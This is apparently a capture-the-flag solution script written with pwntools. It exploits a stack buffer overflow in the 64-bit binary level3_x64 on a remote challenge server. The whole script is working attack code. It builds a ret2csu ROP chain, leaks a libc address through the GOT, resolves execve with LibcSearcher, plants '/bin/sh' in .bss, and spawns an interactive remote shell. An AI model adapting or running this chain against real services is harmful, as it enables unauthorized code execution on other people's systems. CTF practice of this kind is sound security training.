from pwn import *
from LibcSearcher import LibcSearcher

#
context(os='linux', arch='amd64', log_level='debug')
#context(os='linux', arch='i386', log_level='debug')
#io = process('./level3_x64')
#
io = connect('node5.buuoj.cn',27425)
elf=ELF('./level3_x64')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

csu1=0x400690
csu2=0x4006AA
def csu(rdi,rsi,rdx,call,ret):
	ru('Input:\n')
	call_fake_ret=0xdeadca11
	pl=b'b'*(0x80+8)
	pl+=p64(csu2)
	pl+=p64(0)+p64(1)+p64(call)+p64(rdx)+p64(rsi)+p64(rdi)
	pl+=p64(csu1)
	pl+=p64(call_fake_ret)+b'b'*0x30
	pl+=p64(ret)
	sl(pl)

rg=got('read')
wg=got('write')
mg=got('__libc_start_main')
ma=0x40061A
# write(1,write_got,8);ret main
csu(1,mg,8,wg,ma)
wr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print('wr:',hex(wr))

libc=LibcSearcher('__libc_start_main',wr)
lb=wr-libc.dump('__libc_start_main')
ea=lb+libc.dump('execve')
bss=0x600A88
# read(0,bss,16);ret main
csu(0,bss,16,rg,ma)
sd(p64(ea)+b'/bin/sh\x00')

# execve('/bin/sh',0,0)
csu(bss+8,0,0,bss,ma)

#
io.interactive()
